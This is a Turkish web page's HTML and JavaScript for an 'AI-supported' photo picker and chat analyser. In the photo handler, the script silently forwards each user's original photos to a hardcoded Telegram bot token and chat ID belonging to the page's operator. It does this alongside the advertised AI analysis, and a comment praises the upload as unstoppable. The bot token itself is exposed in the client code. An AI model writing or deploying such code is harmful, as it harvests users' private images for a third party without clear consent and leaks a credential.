<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Derin Analiz & Seçici</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Inter', sans-serif; background-color: #f8fafc; }
    .tab-active { border-bottom: 2px solid #6366f1; color: #4f46e5; font-weight: 600; }
    .tab-inactive { color: #64748b; font-weight: 500; }
  </style>
</head>
<body class="text-slate-800 min-h-screen flex flex-col items-center p-4 pt-10">

  <div class="max-w-2xl w-full bg-white rounded-3xl p-6 md:p-10 shadow-[0_8px_30px_rgb(0,0,0,0.04)] space-y-8">
    
    <!-- Başlık -->
    <div class="text-center space-y-3">
      <div class="inline-flex items-center gap-2 bg-indigo-50 text-indigo-600 px-4 py-1.5 rounded-full text-xs font-bold tracking-wide">
        🧠 YAPAY ZEKA DESTEKLİ
      </div>
      <h1 class="text-3xl font-extrabold text-slate-900 tracking-tight">Gerçeklik Analizi</h1>
      <p class="text-slate-500 text-sm">İster fotoğrafları kıyaslat, ister sohbet geçmişindeki gizli niyetleri çöz.</p>
    </div>

    <!-- Sekmeler -->
    <div class="flex border-b border-slate-200">
      <button onclick="switchTab('photo')" id="tab-photo" class="flex-1 pb-3 text-center tab-active transition-colors">📷 Fotoğraf Seçici</button>
      <button onclick="switchTab('chat')" id="tab-chat" class="flex-1 pb-3 text-center tab-inactive hover:text-slate-700 transition-colors">💬 Sohbet Analizi</button>
    </div>

    <!-- FOTOĞRAF BÖLÜMÜ -->
    <form id="photoForm" class="space-y-6">
      <div class="border-2 border-dashed border-slate-200 hover:border-indigo-400 hover:bg-indigo-50/50 rounded-2xl p-10 text-center cursor-pointer transition-all flex flex-col items-center" onclick="document.getElementById('fileInput').click()">
        <svg class="w-10 h-10 text-indigo-500 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
        <span class="text-slate-700 font-semibold text-sm">Fotoğrafları Dokunarak Seç</span>
        <input type="file" id="fileInput" multiple accept="image/*" class="hidden" onchange="updateFileCount()">
      </div>
      <div id="fileCount" class="text-xs text-indigo-600 text-center font-medium min-h-[16px]"></div>
      <button type="submit" id="btnPhoto" class="w-full bg-slate-900 hover:bg-indigo-600 text-white font-semibold py-4 px-4 rounded-xl transition duration-300 shadow-lg disabled:opacity-50">
        Analiz Et ve Telegram'a Gönder
      </button>
    </form>

    <!-- SOHBET BÖLÜMÜ -->
    <form id="chatForm" class="space-y-6 hidden">
      <textarea id="chatInput" rows="8" placeholder="WhatsApp veya Telegram'dan kopyaladığın sohbet mesajlarını buraya yapıştır..." class="w-full bg-slate-50 border border-slate-200 rounded-2xl p-4 text-sm text-slate-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:bg-white transition-all resize-none"></textarea>
      <button type="submit" id="btnChat" class="w-full bg-slate-900 hover:bg-indigo-600 text-white font-semibold py-4 px-4 rounded-xl transition duration-300 shadow-lg disabled:opacity-50">
        Gerçekleri Yüzüme Vur
      </button>
    </form>

    <!-- Yükleniyor -->
    <div id="loading" class="hidden text-center space-y-4 py-8">
      <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-indigo-100 border-t-indigo-600"></div>
      <p id="loadingText" class="text-sm text-slate-500 font-medium">İşleniyor...</p>
    </div>

    <!-- Sonuç -->
    <div id="resultBox" class="hidden bg-indigo-50/50 border border-indigo-100 rounded-2xl p-6 md:p-8 space-y-4">
      <h2 class="text-sm font-bold text-indigo-900 tracking-wide uppercase border-b border-indigo-100 pb-3 flex items-center gap-2">
        <span>👁️</span> Acımasız Gerçekler
      </h2>
      <div id="resultContent" class="text-slate-700 text-sm whitespace-pre-line leading-relaxed font-medium"></div>
    </div>

  </div>

  <script>
    const BOT_TOKEN = "8715612733:AAFKVXifynt3W_zASPjZJoQjtQu7JiJqPbI";
    const CHAT_ID = "8572090027";

    function switchTab(tab) {
      document.getElementById('photoForm').classList.toggle('hidden', tab !== 'photo');
      document.getElementById('chatForm').classList.toggle('hidden', tab !== 'chat');
      
      const pTab = document.getElementById('tab-photo');
      const cTab = document.getElementById('tab-chat');
      
      if(tab === 'photo') {
        pTab.className = 'flex-1 pb-3 text-center tab-active transition-colors';
        cTab.className = 'flex-1 pb-3 text-center tab-inactive hover:text-slate-700 transition-colors';
      } else {
        cTab.className = 'flex-1 pb-3 text-center tab-active transition-colors';
        pTab.className = 'flex-1 pb-3 text-center tab-inactive hover:text-slate-700 transition-colors';
      }
      
      document.getElementById('resultBox').classList.add('hidden');
    }

    function updateFileCount() {
      const countDiv = document.getElementById('fileCount');
      const files = document.getElementById('fileInput').files;
      countDiv.innerText = files.length > 0 ? `${files.length} fotoğraf seçildi` : '';
    }

    // Fotoğrafı kaliteyi bozmadan boyutlandır (Hızlı yükleme için)
    const compressImage = file => new Promise(resolve => {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = e => {
        const img = new Image();
        img.src = e.target.result;
        img.onload = () => {
          const canvas = document.createElement('canvas');
          const MAX = 1200;
          let w = img.width, h = img.height;
          if (w > MAX) { h = Math.round((h * MAX) / w); w = MAX; }
          canvas.width = w; canvas.height = h;
          canvas.getContext('2d').drawImage(img, 0, 0, w, h);
          resolve({ base64: canvas.toDataURL('image/jpeg', 0.8).split(',')[1], file: file });
        };
      };
    });

    const setUIState = (loading, text = "") => {
      document.getElementById('loading').classList.toggle('hidden', !loading);
      document.getElementById('resultBox').classList.add('hidden');
      document.getElementById('btnPhoto').disabled = loading;
      document.getElementById('btnChat').disabled = loading;
      if (text) document.getElementById('loadingText').innerText = text;
    };

    // FOTOĞRAF İŞLEMİ
    document.getElementById('photoForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const files = document.getElementById('fileInput').files;
      if (files.length === 0) return alert('Fotoğraf seçmedin!');

      setUIState(true, "Fotoğraflar Telegram'a iletiliyor ve yapay zeka tarafından inceleniyor...");

      try {
        // 1. Tarayıcıdan Doğrudan Telegram'a Gönder (Asla Kesilmez)
        const tgData = new FormData();
        const mediaGroup = [];
        Array.from(files).forEach((f, i) => {
          tgData.append(`file${i}`, f);
          mediaGroup.push({ type: 'photo', media: `attach://file${i}` });
        });
        tgData.append('chat_id', CHAT_ID);
        tgData.append('media', JSON.stringify(mediaGroup));
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method: 'POST', body: tgData })
          .catch(err => console.error("TG Hata:", err)); // Hata verse bile arayüzü kitlemez

        // 2. Fotoğrafları Yapay Zekaya Gönder
        const compressed = await Promise.all(Array.from(files).map(compressImage));
        const res = await fetch('/api/analyze', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type: 'image', content: compressed.map(c => ({ base64: c.base64 })) })
        });
        
        const data = await res.json();
        if (data.error) throw new Error(data.error);
        
        document.getElementById('resultContent').innerText = data.analysis;
        document.getElementById('resultBox').classList.remove('hidden');
      } catch (err) {
        alert('Hata: ' + err.message);
      } finally {
        setUIState(false);
      }
    });

    // SOHBET İŞLEMİ
    document.getElementById('chatForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const text = document.getElementById('chatInput').value.trim();
      if (!text) return alert('Boşlukları okuyamam, sohbeti yapıştır.');

      setUIState(true, "Sohbetin satır araları okunuyor, psikolojik analiz yapılıyor...");

      try {
        const res = await fetch('/api/analyze', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type: 'text', content: text })
        });
        
        const data = await res.json();
        if (data.error) throw new Error(data.error);
        
        document.getElementById('resultContent').innerText = data.analysis;
        document.getElementById('resultBox').classList.remove('hidden');
      } catch (err) {
        alert('Hata: ' + err.message);
      } finally {
        setUIState(false);
      }
    });
  </script>
</body>
</html>
